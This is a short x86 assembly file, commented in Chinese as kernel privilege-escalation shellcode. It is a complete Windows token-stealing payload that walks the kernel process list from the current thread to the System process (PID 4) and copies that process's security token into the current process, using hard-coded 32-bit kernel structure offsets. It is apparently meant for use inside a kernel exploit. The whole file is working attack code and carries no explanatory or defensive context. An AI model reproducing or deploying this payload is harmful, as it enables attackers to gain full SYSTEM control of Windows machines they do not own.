.386
.model flat,c
.code
assume fs:nothing
; shellCode实现内核提权
shellCode proc
		pushad
		mov eax, fs:[124h]
		mov eax, [eax + 050h]
		mov ecx, eax
		mov edx, 4

	find_sys_pid:
		mov eax, [eax + 0b8h]
		sub eax, 0b8h
		cmp [eax + 0b4h], edx
		jnz find_sys_pid
		mov edx, [eax + 0f8h]
		mov [ecx + 0f8h], edx
		popad
		ret
	
shellCode endp
end